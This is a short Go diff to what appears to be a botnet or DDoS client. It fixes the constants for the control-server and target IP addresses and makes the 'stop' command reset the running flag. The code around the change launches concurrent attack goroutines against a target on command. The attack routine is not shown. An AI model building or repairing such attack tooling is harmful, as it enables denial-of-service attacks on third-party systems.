@@ -11,8 +11,8 @@ import (
 
 var running int
 
-const TARGET_IP = ""          // control server IP here
-const SERVER_IP = "127.0.0.1" // target IP here
+const TARGET_IP = "" // target IP here
+const SERVER_IP = "" // control server IP here
 
 func main() {
 	var threads sync.WaitGroup
@@ -52,6 +52,7 @@ func main() {
 				go attack(target)
 			}
 		} else if cmd_arg1 == "stop" {
+			running = 0
 			fmt.Println("Stopping attack...")
 			threads.Wait()
 		}
